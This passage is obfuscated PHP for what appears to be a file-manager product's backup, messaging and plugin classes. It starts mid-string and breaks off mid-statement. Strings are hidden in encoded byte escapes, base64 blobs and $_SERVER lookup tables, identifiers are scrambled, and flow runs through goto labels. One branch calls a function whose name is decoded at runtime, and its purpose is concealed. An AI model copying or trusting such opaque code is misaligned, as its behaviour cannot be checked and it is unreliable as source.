8\xff\xd5\x83\x47\x63\xca\xa8\x6\xdb\xf2\xd8\x61\x3\xe1\x6f\x49\x6b\xe1\x91\x14\x93\xdd\xb1\xf6\xd4\xd6\xf\xeb\xe\x49\x5e\xd5\xe6\xcf\x7b\xa\x61\x66\x69\x49\xbd\x68\x50"."\347\32\62\75\161\221\123\51\373\361\143\236\104\220\367\56\34\100\306\56\366\230\131\241\100\376\173\255\26\74\243\234\245\360\30\250\32\353\52\160\74\10\107\333\157\165\65"."\50\360\3\171\311\70\151\2\154\3\165\47\342\246\137\61\50\120\101\246\221\122\104\361\122\134\40\113\105\257\122\102\204\333\317\242\224\3\135\263\45\4\104\44\32\26\120"."\36\251\11\133\306\320\2\24\207\207\277\166\314\236\122\265\344\150\262\275\214\205\23\121\227\110\371\157\341\346\237\26\347\347\146\353\126\314\2\15\122\255\312\32\366\124\151"._kodDe('KvGNxuFbZllyEszGEBSS4QjCnRH5lFi6d232kiRsefGOblTp1VK61xgh5gbwP+/L').base64_decode('bYuuId7LCmXqDsEWUHg3M+9dPNuBABCE+AmZqiGnpqTbodamEnSlgWAq4OOF98Y=')."\xcd\x74\x16\xab\xc1\x6\x85\xed\x93\xde\x17\x12\x4c\x71\x9\xc8\xa2\xac\x32\x44\x9f\xd4\xd6\x9c\xd0\xb8\xda\xba\x52\x26\x17\x4a\x16\xd3\x74\x43\x48\xc6\xe0\x85\xd2\xc2\xa7\x7\x4d\xcb\x68".base64_decode('ck+zdg+zSOjFcqxFnCXHkSJIOK0DnG3c6iAbRSIwdVFF36Pn503W4z7mTDOPUuU=').base64_decode('VL8QjXJRfyfgF96b8vGL5Cgaa8k9PbJJD83suayvkgqHgzGEO9788x9+LCXs+zQ=')."\33\24\73\70\11\266\301\5\72\317\251\235\334\303\217\174\70\343\33\217\263\27\160\55\111\343\224\365\147\120\0\341\217\345\102\66\107\270\212\311\255\177\225\136\373\3\207"."\x2e\xf1\xfa\xa6\x25\x61\x3e\x94\x5f\xd5\x14\xf2\x73\xed\x3f\xef\x26\x84\x15\xea\x3e\x5a\x32\xd6\xec\xe2\x55\x50\x86\x54\x1c\x84\x9d\xe\x33\xb3\x19\x41\xc8\x80\x56\xec\xdc\x9e\x6\x77\x85"."\x49\xcc\xbc\x4a\xeb\xc5\x53\x96\x8c\xcd\x19\x48\x83\xee\xc\x38\x2d\x50\x9b\xd8\x4\xf5\xf\x74\xc7\xb6\x45\x19\xe2\xe3\xbe\xd6\x33\x3f\x51\x84\x17\x50\x40\x49\xf9\x85\xe2\xc4\xf3\xc0\xfd"."\x66\x8\x15\xae\x84\x63\xa5\x75\x88\x85\x4b\xba\x3c\x82\x6e\x56\x62\x29\x16\x62\xc7\x3a\x46\x52\x6\xc5\x48\x4b\x73\xec\x53\x8b\x38\x7e\x8e\xbe\x18\x98\x46\x2a\x4e\x1c\xe7\xb1\x46\xe1\xf4"."\212\255\365\142\6\173\317\160\16\243\127\65\143\111\101\14\311\217\314\207\353\171\203\112\52\52\334\136\173\253\350\230\332\205\63\136\110\136\173\4\243\202\260\126\40\17\156".base64_decode('UcFsOArm5OyiJe9+hgDmxVEwb140zSzoMoR8ppwz9tO9/MEjAn68QIdtYjBOur8=')."\xf1\x2c\x98\x38\xbf\x3a\x82\x71\xf6\xd4\x48\x23\x50\xb8\x15\x5c\x90\xb7\x1d\xdc\x16\x6a\x45\xc1\xc4\xfb\x6d\x45\x81\x67\xb5\x89\xeb\xaf\x2\xb4\x96\xc6\x14\xa0\xae\xfc\x94\x3f\x9f\x8e\xf3"."\270\2\66\7\270\114\270\107\213\236\146\12\104\213\6\14\205\115\34\202\5\227\276\141\265\75\260\301\305\201\241\166\110\100\70\343\17\65\13\26\273\303\54\44\75\227\351"."\xca\x68\x6c\x9b\x88\x73\x6b\x31\x68\x8c\xca\x9e\x36\x66\xd5\xe5\x95\x66\x45\xcd\x4c\x4e\xb0\x23\x2d\x68\x40\xec\x80\xa2\x75\xbe\xd0\x9a\x92\xa9\x4e\x5c\xb0\xbc\xc6\x52\x8b\x66\xaa\x31\xc1"."\xfe\x89\x5b\xa1\xb2\x6e\xaa\x9c\x8d\x4f\x9\xba\x37\x9b\xda\x8b\xb\xfa\x96\x23\xf0\x2\x8a\x21\x4\xc2\x9f\x2e\xae\x5e\xb6\xd8\xa1\xe3\xfd\x9f\xe8\xd5\xf1\xe9\x5a\x2d\x3c\x8c\x65\x47\x2a"."\120\274\162\340\375\22\107\207\64\335\164\300\270\260\226\105\277\65\232\151\362\103\143\54\56\43\46\17\156\172\16\301\366\1\174\361\363\23\70\212\110\245\217\320\21\221\15"."\xf4\x49\xce\xf9\xa0\x1c\x1a\x52\x70\x2c\x22\x36\x96\x0\x3c\x2a\x60\x1\x71\x4f\x23\xe7\x7d\xf5\x39\xdb\x89\x24\x7\x0\x21\x32\xaa\xf5\x51\xb7\x6e\xf0\x7e\x2b\x6f\xf\x7f\x11\x59\xb6\x33"."\162\234\7\41\370\46\132\162\240\133\304\206\33\307\270\211\103\134\47\52\203\74\260\341\352\314\166\130\262\343\47\3\230\5\343\257\225\100\324\222\274\10\354\50\23\151\224"."\xa0\xcb\x58\xef\x4c\x5f\x28\x1c\xca\x8b\x6a\xf1\x84\x42\x33\x2\xc1\x3a\xec\x57\x33\x2f\x1a\xe5\x12\x8c\x66\xf2\xa2\x5a\x1a\x3\xcd\xfb\x8b\xf3\x36\x79\x7c\xfe\xbc\x38\x68\x44\xd3\x1c\xe1"."\176\177\160\224\257\5\265\322\343\367\7\146\354\257\25\276\332\251\274\45\350\20\225\153\273\263\111\215\52\261\351\151\100\110\116\121\131\132\270\32\247\244\271\3\50\236\307".base64_decode('qiIQ59WgvtHYh9X7vM2ejSIsKQgawDSTsoNZAoV+RtniZswy6pBoN8ePiV2W42Q=').base64_decode('AY4WCyIxAhKKuysCjCg4YqLqNF+Vj2L5iMCWTtGiONCpRQVVPZZdyH01MsaC1RM=')."\xfe\x26\xd1\xff\x3\x75\x62\x3a\x6c\x26\xa2\x0\x0".""."", 10, -8))); goto A“‚Å…ìë¬; eé¯‹ˆÕÙ¡: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E²é½’„Œ¯; fìéóºêØ¡: $CİƒÈ”ò­ù = $FŒåììö¶Õ = 0; try { $a¥Ô«å£õ¬ = $d¿‡ô—½ÚÅ->db()->getTables(); } catch (Exception $dŠÑ¿ëù¸Ë) { return !1; } $a¥Ô«å£õ¬ = array_diff($a¥Ô«å£õ¬, array($CÄƒ˜ğôºİ[763], $CÄƒ˜ğôºİ[764])); goto EÜÉ†¹…˜; fëÈÊ•‰ø¨: self::$name = $aõ˜™Û»ÚÈ[$CÄƒ˜ğôºİ[28]]; $bËˆ½òñ™Ô = $GLOBALS[$CÄƒ˜ğôºİ[6]][$CÄƒ˜ğôºİ[17]]; $BòìÁÕâó = $this->_dbType($bËˆ½òñ™Ô); goto C…ƒéÃšÄ²; D—Ğ–ÒñŒ: if (isset($Bµá£Ì¢->task[$CÄƒ˜ğôºİ[772]])) { $Cš‚í¤õø = $Bµá£Ì¢->task[$CÄƒ˜ğôºİ[772]] ? $Bµá£Ì¢->task[$CÄƒ˜ğôºİ[772]] : timeFloat(); $A®×º£œ¤À = $Cš‚í¤õø - $Bµá£Ì¢->task[$CÄƒ˜ğôºİ[773]]; if ($A®×º£œ¤À >= 0.2) { $CİƒÈ”ò­ù += 1; } } $Bµá£Ì¢->end(); $E—ìæ„ßŒØ = array($CÄƒ˜ğôºİ[760] => $BòìÁÕâó, $CÄƒ˜ğôºİ[757] => 1, $CÄƒ˜ğôºİ[774] => $CİƒÈ”ò­ù, $CÄƒ˜ğôºİ[775] => $FŒåììö¶Õ, $CÄƒ˜ğôºİ[776] => time()); goto fÎŠ¬ßÎÛ²; FÅ¶ã††ê: $dã¥†´…À = $this->tmpFilesPath() . $CÄƒ˜ğôºİ[762] . self::$name . $CÄƒ˜ğôºİ[8]; del_dir($dã¥†´…À); mk_dir($dã¥†´…À); goto fìéóºêØ¡; E²é½’„Œ¯: $CÄƒ˜ğôºİ =& $_SERVER[›èö’ù¤]; $aõ˜™Û»ÚÈ = Backup::get(); self::$io = $aõ˜™Û»ÚÈ[$CÄƒ˜ğôºİ[736]]; goto fëÈÊ•‰ø¨; EÜÉ†¹…˜: foreach ($a¥Ô«å£õ¬ as $A¨ß¥ÒõË) { $CİƒÈ”ò­ù += $d¿‡ô—½ÚÅ->model($A¨ß¥ÒõË)->count(); } $Bµá£Ì¢ = new Task($CÄƒ˜ğôºİ[765], $CÄƒ˜ğôºİ[766], $CİƒÈ”ò­ù, LNG($CÄƒ˜ğôºİ[767]) . $CÄƒ˜ğôºİ[768] . LNG($CÄƒ˜ğôºİ[769])); foreach ($a¥Ô«å£õ¬ as $A¨ß¥ÒõË) { $F•‰ˆ—§Ìâ = $dã¥†´…À . $A¨ß¥ÒõË . $CÄƒ˜ğôºİ[770]; $CŠã•š“» = null; if ($A¨ß¥ÒõË == $CÄƒ˜ğôºİ[771] && (!isset($aõ˜™Û»ÚÈ[$CÄƒ˜ğôºİ[739]]) || $aõ˜™Û»ÚÈ[$CÄƒ˜ğôºİ[739]] == $CÄƒ˜ğôºİ[191])) { $CŠã•š“» = self::$io; } $FŒåììö¶Õ += $d¿‡ô—½ÚÅ->sqlFromDb($A¨ß¥ÒõË, $F•‰ˆ—§Ìâ, $Bµá£Ì¢, $CŠã•š“»); } goto D—Ğ–ÒñŒ; fÎŠ¬ßÎÛ²: Backup::set($E—ìæ„ßŒØ); if ($CİƒÈ”ò­ù - $FŒåììö¶Õ > 1) { $FêÕºôö•‡ = $CÄƒ˜ğôºİ[777]; if (stristr(I18n::getType(), $CÄƒ˜ğôºİ[778])) { $FêÕºôö•‡ = $CÄƒ˜ğôºİ[779]; } write_log(array($FêÕºôö•‡, $E—ìæ„ßŒØ), $CÄƒ˜ğôºİ[766]); return !1; } return !0; goto Cõ»ìŒÒÂº; C…ƒéÃšÄ²: $d¿‡ô—½ÚÅ = new DbManage($bËˆ½òñ™Ô, $BòìÁÕâó); $E—ìæ„ßŒØ = array($CÄƒ˜ğôºİ[760] => $BòìÁÕâó, $CÄƒ˜ğôºİ[761] => time()); Backup::set($E—ìæ„ßŒØ); goto FÅ¶ã††ê; Cõ»ìŒÒÂº: } private function _dbType($Eµ…Ò»ø½•) { goto B©ÌÚ¯Û¨©; F´¨²·Ê : return $D£¦ÔéÕ»­; goto e—Ãµ”²æ; bÆœó¨¨Ë: if ($D£¦ÔéÕ»­ == $EğÙ‡Øø®¼[781]) { $AÏï§Ïöç = explode($EğÙ‡Øø®¼[4], $Eµ…Ò»ø½•[$EğÙ‡Øø®¼[782]]); $D£¦ÔéÕ»­ = $AÏï§Ïöç[0]; } $Fğ®Åœ‘¥ = array($EğÙ‡Øø®¼[783] => $EğÙ‡Øø®¼[9], $EğÙ‡Øø®¼[784] => $EğÙ‡Øø®¼[785]); if (isset($Fğ®Åœ‘¥[$D£¦ÔéÕ»­])) { $D£¦ÔéÕ»­ = $Fğ®Åœ‘¥[$D£¦ÔéÕ»­]; } goto F´¨²·Ê ; B©ÌÚ¯Û¨©: $EğÙ‡Øø®¼ =& $_SERVER[›èö’ù¤]; $Eµ…Ò»ø½• = array_change_key_case($Eµ…Ò»ø½•); $D£¦ÔéÕ»­ = $Eµ…Ò»ø½•[$EğÙ‡Øø®¼[780]]; goto bÆœó¨¨Ë; e—Ãµ”²æ: } private function tmpFilesPath() { $dÚÒíƒÅÎö =& $_SERVER[›èö’ù¤]; $f¦ñÃ‰ÜÉ­ = TEMP_FILES; if ($GLOBALS[$dÚÒíƒÅÎö[6]][$dÚÒíƒÅÎö[88]][$dÚÒíƒÅÎö[786]]) { $f¦ñÃ‰ÜÉ­ = $GLOBALS[$dÚÒíƒÅÎö[6]][$dÚÒíƒÅÎö[88]][$dÚÒíƒÅÎö[786]]; if (!mk_dir($f¦ñÃ‰ÜÉ­) || !is_writable($f¦ñÃ‰ÜÉ­) || !IO::mkfile($f¦ñÃ‰ÜÉ­ . $dÚÒíƒÅÎö[787])) { $f¦ñÃ‰ÜÉ­ = TEMP_FILES; } } return $f¦ñÃ‰ÜÉ­; } } class BackupDbFile { public function __construct() { } public function index() { goto eø¤½£¦; e¶ÖÎ³: if (!$FÓ¯‡ƒº©â) { return !1; } $D…†»¡Æ’ = array($fù½•ÒÒ[788] => $FÓ¯‡ƒº©â, $fù½•ÒÒ[789] => time()); Backup::set($D…†»¡Æ’); goto CÂŠ‘ìô‡–; EŞÓºø¥¦¡: $A§«ãåô“  = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\160\137{$D¢ÍõÊøÀ‰}\x2f"; $CÏ‘’œ’ç = $this->backupPath($B½‡®À¸ĞÔ); if (!($CÏ‘’œ’ç = IO::mkdir($CÏ‘’œ’ç))) { return !1; } goto DÂ’ÍÓÃÙÎ; DæÛ·§: $dÚÓ§‹ÀªÛ = CONTROLLER_DIR . $fù½•ÒÒ[794]; $Féæ‚´ˆ¥­ = CONTROLLER_DIR . $fù½•ÒÒ[795]; IO::copy($dÚÓ§‹ÀªÛ, $CÏ‘’œ’ç); goto f¸®ˆßÀì; f¸®ˆßÀì: IO::copy($Féæ‚´ˆ¥­, $CÏ‘’œ’ç); $A±ÚÅÓ³ÓÆ->end(); $D…†»¡Æ’ = array($fù½•ÒÒ[796] => $FÓ¯‡ƒº©â, $fù½•ÒÒ[797] => time()); goto B’æ“Áˆ™µ; B’æ“Áˆ™µ: Backup::set($D…†»¡Æ’); return !0; goto e«‡ÛÔáï—; CÂŠ‘ìô‡–: $A±ÚÅÓ³ÓÆ = new TaskFileTransfer($fù½•ÒÒ[790], $fù½•ÒÒ[766], count($d…øæŸÖ­”), LNG($fù½•ÒÒ[767]) . $fù½•ÒÒ[455] . LNG($fù½•ÒÒ[769]) . $fù½•ÒÒ[791]); $A±ÚÅÓ³ÓÆ->task[$fù½•ÒÒ[747]] = $FÓ¯‡ƒº©â; foreach ($dÚİ²¦Š­«[$fù½•ÒÒ[74]] as $bÓóµ¿›½¨) { $e“óÇÓ†‡¯ = IO::move($bÓóµ¿›½¨[$fù½•ÒÒ[76]], $CÏ‘’œ’ç); if (!$e“óÇÓ†‡¯) { $A±ÚÅÓ³ÓÆ->end(); $f¤¸í„ö‘ = IO::getLastError($fù½•ÒÒ[792] . $bÓóµ¿›½¨[$fù½•ÒÒ[76]] . $fù½•ÒÒ[793] . $CÏ‘’œ’ç . $fù½•ÒÒ[531]); write_log($f¤¸í„ö‘, $fù½•ÒÒ[766]); return !1; } } goto DæÛ·§; DÂ’ÍÓÃÙÎ: $dÚİ²¦Š­« = IO::listPath($A§«ãåô“ ); $d…øæŸÖ­” = isset($dÚİ²¦Š­«[$fù½•ÒÒ[74]]) ? $dÚİ²¦Š­«[$fù½•ÒÒ[74]] : array(); $FÓ¯‡ƒº©â = array_sum(array_column($d…øæŸÖ­”, $fù½•ÒÒ[78])); goto e¶ÖÎ³; eø¤½£¦: $fù½•ÒÒ =& $_SERVER[›èö’ù¤]; $B½‡®À¸ĞÔ = Backup::get(); $D¢ÍõÊøÀ‰ = $B½‡®À¸ĞÔ[$fù½•ÒÒ[28]]; goto EŞÓºø¥¦¡; e«‡ÛÔáï—: } private function backupPath($b±°ÔÕµŒÛ) { $D½ÑÁ‚Ï¿ =& $_SERVER[›èö’ù¤]; $C¿Š…Êä» = $b±°ÔÕµŒÛ[$D½ÑÁ‚Ï¿[28]]; $b÷êØĞ„ê = Model($D½ÑÁ‚Ï¿[754])->get($D½ÑÁ‚Ï¿[755]); $e‚ÓÂ™ç¤Ê = substr(md5($D½ÑÁ‚Ï¿[756] . $b÷êØĞ„ê . $C¿Š…Êä»), 0, 8); return "\x7b\x69\x6f\72{$b±°ÔÕµŒÛ[$D½ÑÁ‚Ï¿[736]]}\175\57\144\141\x74\141\142\x61\x73\x65\57\142\x61\143\153\x75\160\57" . $C¿Š…Êä» . $D½ÑÁ‚Ï¿[71] . $e‚ÓÂ™ç¤Ê; } private function tmpFilesPath() { $AÕ§Åæ¢„Î =& $_SERVER[›èö’ù¤]; $DùˆÏÜ˜Ïá = TEMP_FILES; if ($GLOBALS[$AÕ§Åæ¢„Î[6]][$AÕ§Åæ¢„Î[88]][$AÕ§Åæ¢„Î[786]]) { $DùˆÏÜ˜Ïá = $GLOBALS[$AÕ§Åæ¢„Î[6]][$AÕ§Åæ¢„Î[88]][$AÕ§Åæ¢„Î[786]]; if (!mk_dir($DùˆÏÜ˜Ïá) || !is_writable($DùˆÏÜ˜Ïá) || !IO::mkfile($DùˆÏÜ˜Ïá . $AÕ§Åæ¢„Î[787])) { $DùˆÏÜ˜Ïá = TEMP_FILES; } } return $DùˆÏÜ˜Ïá; } } class BackupFile { public function __construct() { } public function index() { goto B¹†‘âèÚ˜; d¯÷äµ•ñ: $F’Ì®²¼ª½ = !0; $D´÷‹Š’ö = $this->storeIds(); $eµ¡‡Ä«Àõ = 1; goto Fä©Ç—¶»; fŞõ›ùÙ¶æ: $aÅè¨Ì˜ŞÊ = $DáÓäÉ‹é„ = 0; do { $A‰ŒŸˆíñ° = $_SERVER[›èö’ù¤][805]; $fÀÇ»·ó‡ = Model($_SERVER[›èö’ù¤][771])->where($Cöé¿§°)->field($A‰ŒŸˆíñ°)->order($_SERVER[›èö’ù¤][806])->selectPage($b“ßãÆØ³, $eµ¡‡Ä«Àõ); $a‘ËÉËÃ¹õ = !empty($fÀÇ»·ó‡[$_SERVER[›èö’ù¤][367]]) ? $fÀÇ»·ó‡[$_SERVER[›èö’ù¤][367]] : array(); foreach ($a‘ËÉËÃ¹õ as $f¬„°›ˆ) { goto bª‚æÁíä‚; bª‚æÁíä‚: if (!$this->_fileExist($f¬„°›ˆ, $fç¶Áò¿Éò, $D´÷‹Š’ö)) { $e®ö…ò²à™ -= 1; $B¢ç£Ö×½ß -= (int) $f¬„°›ˆ[$_SERVER[›èö’ù¤][78]]; write_log("\146\151\154\145\40\156\157\x74\x20\x65\x78\151\163\164\x2e\146\x69\154\145\111\x44\x3a{$f¬„°›ˆ[$_SERVER[›èö’ù¤][462]]}\54\x20\x70\141\164\150\x3a{$f¬„°›ˆ[$_SERVER[›èö’ù¤][76]]}", $_SERVER[›èö’ù¤][807]); continue; } $AåÖ–ä•‡Ô = $f¬„°›ˆ[$_SERVER[›èö’ù¤][76]]; $EÁŒäÁÉÀ© = "\x7b\x69\157\72{$Cæêğ®‹š´[$_SERVER[›èö’ù¤][736]]}\x7d" . substr($AåÖ–ä•‡Ô, strlen("\173\151\157\72{$f¬„°›ˆ[$_SERVER[›èö’ù¤][808]]}\175")); goto Aê‡à¯®¥ğ; FŠ‰•ø½‹: $C±ö¿óŒÖ„ += $f¬„°›ˆ[$_SERVER[›èö’ù¤][78]]; $DáÓäÉ‹é„ += 1; $aÅè¨Ì˜ŞÊ += $f¬„°›ˆ[$_SERVER[›èö’ù¤][78]]; goto EªÆ¾—ƒ‚Õ; EªÆ¾—ƒ‚Õ: if ($C±ö¿óŒÖ„ >= 1024 * 1024 * 100) { $e§ ª–Š‘İ = array($_SERVER[›èö’ù¤][811] => $CäŠ ÃãÃ°, $_SERVER[›èö’ù¤][812] => $DáÓäÉ‹é„, $_SERVER[›èö’ù¤][813] => $aÅè¨Ì˜ŞÊ); Backup::set($e§ ª–Š‘İ); $C±ö¿óŒÖ„ = $aâ³­Â”Ü¦ = 0; } goto AÜ‡—îí‚; Aê‡à¯®¥ğ: if (IO::exist($EÁŒäÁÉÀ©)) { $aÂï†¤‡Ç->updateFileEnd($f¬„°›ˆ[$_SERVER[›èö’ù¤][28]], $f¬„°›ˆ[$_SERVER[›èö’ù¤][78]]); } else { $EÁŒäÁÉÀ© = get_path_father($EÁŒäÁÉÀ©); IO::mkdir($EÁŒäÁÉÀ©); if (!IO::copy($AåÖ–ä•‡Ô, $EÁŒäÁÉÀ©, $_SERVER[›èö’ù¤][809])) { write_log($_SERVER[›èö’ù¤][810] . $AåÖ–ä•‡Ô . $_SERVER[›èö’ù¤][793] . $EÁŒäÁÉÀ© . $_SERVER[›èö’ù¤][531], $_SERVER[›èö’ù¤][766]); $F’Ì®²¼ª½ = !1; break; } } $CäŠ ÃãÃ° = $f¬„°›ˆ[$_SERVER[›èö’ù¤][462]]; $aâ³­Â”Ü¦ += 1; goto FŠ‰•ø½‹; AÜ‡—îí‚: } $F ’©ÊÚ² = count($a‘ËÉËÃ¹õ); $eµ¡‡Ä«Àõ++; } while ($F ’©ÊÚ² == $b“ßãÆØ³); $aÂï†¤‡Ç->end(); goto aÂ¼«Üˆ–; aÂ¼«Üˆ–: $e§ ª–Š‘İ = array($_SERVER[›èö’ù¤][814] => 1, $_SERVER[›èö’ù¤][491] => time(), $_SERVER[›èö’ù¤][759] => 1, $_SERVER[›èö’ù¤][811] => $CäŠ ÃãÃ°, $_SERVER[›èö’ù¤][803] => $B¢ç£Ö×½ß, $_SERVER[›èö’ù¤][802] => $e®ö…ò²à™, $_SERVER[›èö’ù¤][815] => time()); if ($aâ³­Â”Ü¦) { $e§ ª–Š‘İ[$_SERVER[›èö’ù¤][812]] = $DáÓäÉ‹é„; $e§ ª–Š‘İ[$_SERVER[›èö’ù¤][813]] = $aÅè¨Ì˜ŞÊ; } Backup::set($e§ ª–Š‘İ); goto fêÑ–Á¸Ûˆ; B¹†‘âèÚ˜: $Cæêğ®‹š´ = Backup::get(); $CäŠ ÃãÃ° = $Cæêğ®‹š´[$_SERVER[›èö’ù¤][291]][$_SERVER[›èö’ù¤][193]][$_SERVER[›èö’ù¤][462]]; $Cöé¿§° = array($_SERVER[›èö’ù¤][463] => array($_SERVER[›èö’ù¤][798], $CäŠ ÃãÃ°), $_SERVER[›èö’ù¤][799] => array($_SERVER[›èö’ù¤][329], $Cæêğ®‹š´[$_SERVER[›èö’ù¤][736]])); goto Eé¬©Â‹¾ğ; Fä©Ç—¶»: $b“ßãÆØ³ = 1000; $C±ö¿óŒÖ„ = $aâ³­Â”Ü¦ = 0; $fç¶Áò¿Éò = array(); goto fŞõ›ùÙ¶æ; fêÑ–Á¸Ûˆ: $this->_fileFilter($fç¶Áò¿Éò); return !0; goto eª±İìÈ¤å; eµªÆ¶õ«ì: $aÂï†¤‡Ç->task[$_SERVER[›èö’ù¤][747]] = $B¢ç£Ö×½ß; $e§ ª–Š‘İ = array($_SERVER[›èö’ù¤][802] => $e®ö…ò²à™, $_SERVER[›èö’ù¤][803] => $B¢ç£Ö×½ß, $_SERVER[›èö’ù¤][804] => time()); Backup::set($e§ ª–Š‘İ); goto d¯÷äµ•ñ; Eé¬©Â‹¾ğ: $e®ö…ò²à™ = (int) Model($_SERVER[›èö’ù¤][771])->where($Cöé¿§°)->count($_SERVER[›èö’ù¤][462]); $B¢ç£Ö×½ß = (int) Model($_SERVER[›èö’ù¤][771])->where($Cöé¿§°)->sum($_SERVER[›èö’ù¤][78]); $aÂï†¤‡Ç = new TaskFileTransfer($_SERVER[›èö’ù¤][800], $_SERVER[›èö’ù¤][766], $e®ö…ò²à™, LNG($_SERVER[›èö’ù¤][767]) . $_SERVER[›èö’ù¤][768] . LNG($_SERVER[›èö’ù¤][801])); goto eµªÆ¶õ«ì; eª±İìÈ¤å: } private function _fileExist($Fšˆä–¿éÍ, &$aÄªÄ‹Ò, $aïè”¤˜î„) { goto aÃ¬ì½™ô ; AÕÑ÷¿ƒÔÆ: $aÄªÄ‹Ò = array_merge($aÄªÄ‹Ò, array_to_keyvalue($c»Õí¾„·, $DìœÃôƒè[33], $DìœÃôƒè[462])); return !1; goto DáßïŒ³ñİ; AÎÁÆÊ˜®»: if (!in_array($Fšˆä–¿éÍ[$DìœÃôƒè[808]], $aïè”¤˜î„)) { return !1; } if (IO::exist($B³Ïá„­©²)) { return !0; } $Fİ¤ŞæÎíÛ = get_path_father($B³Ïá„­©²); goto C ×³ã¡; C ×³ã¡: if (IO::exist($Fİ¤ŞæÎíÛ)) { $aÄªÄ‹Ò[] = $Fšˆä–¿éÍ[$DìœÃôƒè[462]]; return !1; } $AòÁ¥ÍÀÛ¨ = array($DìœÃôƒè[808] => $Fšˆä–¿éÍ[$DìœÃôƒè[808]], $DìœÃôƒè[76] => array($DìœÃôƒè[381], "{$Fİ¤ŞæÎíÛ}\45")); $c»Õí¾„· = Model($DìœÃôƒè[771])->where($AòÁ¥ÍÀÛ¨)->field($DìœÃôƒè[463])->select(); goto AÕÑ÷¿ƒÔÆ; aÃ¬ì½™ô : $DìœÃôƒè =& $_SERVER[›èö’ù¤]; $B³Ïá„­©² = $Fšˆä–¿éÍ[$DìœÃôƒè[76]]; if (in_array($Fšˆä–¿éÍ[$DìœÃôƒè[462]], $aÄªÄ‹Ò)) { return !1; } goto AÎÁÆÊ˜®»; DáßïŒ³ñİ: } private function _fileFilter($aÖ±Õ«˜ôŒ) { $f¿¬²™µğ =& $_SERVER[›èö’ù¤]; if (empty($aÖ±Õ«˜ôŒ)) { return; } $E§ùÈŸêÈª = array($f¿¬²™µğ[462] => array($f¿¬²™µğ[7], array_unique($aÖ±Õ«˜ôŒ))); $bá‡ä¯šèË = Model($f¿¬²™µğ[816])->where($E§ùÈŸêÈª)->field($f¿¬²™µğ[397])->select(); foreach ($bá‡ä¯šèË as $FµƒÈŒ‘ÏË) { Model($f¿¬²™µğ[816])->remove($FµƒÈŒ‘ÏË[$f¿¬²™µğ[397]], !1); } } private function storeIds() { $eÌ ¿³³ø =& $_SERVER[›èö’ù¤]; $C§ä÷ÛÎâŠ = Model($eÌ ¿³³ø[751])->listData(); $bêƒŞõ²» = array(); $cÄÃÃ…ÀÆ¯ = $GLOBALS[$eÌ ¿³³ø[6]][$eÌ ¿³³ø[88]][$eÌ ¿³³ø[817]]; foreach ($C§ä÷ÛÎâŠ as $CĞÅÀÜ’—) { $A¬¶·½¾‘Š = strtolower($CĞÅÀÜ’—[$eÌ ¿³³ø[94]]); if (!isset($cÄÃÃ…ÀÆ¯[$A¬¶·½¾‘Š])) { continue; } $F™œˆÊå¿… = $eÌ ¿³³ø[72] . (isset($cÄÃÃ…ÀÆ¯[$A¬¶·½¾‘Š]) ? $cÄÃÃ…ÀÆ¯[$A¬¶·½¾‘Š] : ucfirst($A¬¶·½¾‘Š)); if (!class_exists($F™œˆÊå¿…)) { continue; } $bêƒŞõ²»[] = $CĞÅÀÜ’—[$eÌ ¿³³ø[395]]; } return $bêƒŞõ²»; } } goto fâ©Øæï”ë; AÔ×÷ÙÏ­£: class Message { function __construct() { } public function send($DÀ›ÚÎÄ“Ì = '', $bŒƒ±¾¸íÛ = array(), $c®«Äç¾ = "\164\145\170\x74") { goto e¾°ñƒŞ’; béãôöâÍá: Hook::trigger($D·§«¡ŞË [1420], $eÈó¬¼ŸĞ); goto b„ÃÇÖŸò‹; e¾°ñƒŞ’: $D·§«¡ŞË  =& $_SERVER[›èö’ù¤]; $A‚¾·®Œ—˜ = array($D·§«¡ŞË [29] => $D·§«¡ŞË [1417], $D·§«¡ŞË [739] => $DÀ›ÚÎÄ“Ì); if (in_array($c®«Äç¾, array($D·§«¡ŞË [1417], $D·§«¡ŞË [1418]))) { $A‚¾·®Œ—˜[$D·§«¡ŞË [29]] = $c®«Äç¾; } goto A”ã¤ÆÑÔÀ; A”ã¤ÆÑÔÀ: $bŒƒ±¾¸íÛ = array($D·§«¡ŞË [510] => isset($bŒƒ±¾¸íÛ[$D·§«¡ŞË [510]]) ? $bŒƒ±¾¸íÛ[$D·§«¡ŞË [510]] : $D·§«¡ŞË [33], $D·§«¡ŞË [589] => isset($bŒƒ±¾¸íÛ[$D·§«¡ŞË [589]]) ? $bŒƒ±¾¸íÛ[$D·§«¡ŞË [589]] : $D·§«¡ŞË [33]); if (empty($DÀ›ÚÎÄ“Ì) || empty($bŒƒ±¾¸íÛ[$D·§«¡ŞË [510]]) && empty($bŒƒ±¾¸íÛ[$D·§«¡ŞË [589]])) { return !1; } $eÈó¬¼ŸĞ = array($D·§«¡ŞË [1358] => $A‚¾·®Œ—˜, $D·§«¡ŞË [1419] => $bŒƒ±¾¸íÛ); goto béãôöâÍá; b„ÃÇÖŸò‹: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto aÜğ²‰ó³²; F¶ëì‘Ú³Œ: $this->pluginHostDefault = $config[$eº¢ÜÊŸ¥¼[1423]] . $this->pluginName . $eº¢ÜÊŸ¥¼[8]; $f ùˆ¾…Æ® = $config[$eº¢ÜÊŸ¥¼[1424]]; if ($f ùˆ¾…Æ® && strpos($eº¢ÜÊŸ¥¼[47] . $f ùˆ¾…Æ® . $eº¢ÜÊŸ¥¼[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$eº¢ÜÊŸ¥¼[1425]] . $this->pluginName . $eº¢ÜÊŸ¥¼[8]; } goto dçµ™³‹…Ğ; eìó†«• “: $this->in =& $in; $this->modelPlugin = Model($eº¢ÜÊŸ¥¼[1421]); $this->pluginName = str_replace($eº¢ÜÊŸ¥¼[1421], $eº¢ÜÊŸ¥¼[33], get_class($this)); goto díƒÈ½ßš; F¥Î®‘œ†Ñ: if ($_SERVER[$eº¢ÜÊŸ¥¼[831]] != $D“°·ùÙ–è($dé’Ú­Ëˆ)) { goto D¢ĞãİöˆÀ; cŸ¿ÔÈãÜ…: $fÂ´á…ˆ˜® = $eº¢ÜÊŸ¥¼[866]; $fÂ´á…ˆ˜®($_SERVER[$eº¢ÜÊŸ¥¼[867]]); $A§º‘÷äœÈ = $eº¢ÜÊŸ¥¼[865]; goto a¾Ù‰È®Óİ; AÅÒíã•: $C ÙƒÓÎÚ = 